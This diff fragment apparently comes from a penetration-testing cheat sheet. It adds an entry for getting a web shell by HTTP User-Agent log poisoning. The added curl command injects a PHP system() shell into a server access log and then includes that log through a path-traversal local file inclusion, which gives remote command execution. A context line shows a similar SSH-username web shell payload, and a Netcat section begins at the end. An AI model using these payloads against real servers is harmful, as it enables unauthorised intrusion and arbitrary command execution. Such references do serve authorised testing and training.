@@ -20,6 +20,11 @@
   ssh '<?php system($_GET['cmd']); ?>'@192.168.1.2
   ```
 
+* Web Shell (HTTP User-Agent Log Poisoning) [access.log]
+
+  ```cmd
+  curl -s -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://192.168.1.2/browse.php?file=../../../../../var/log/httpd-access.log"
+  ```
 * Netcat
 
   ```cmd
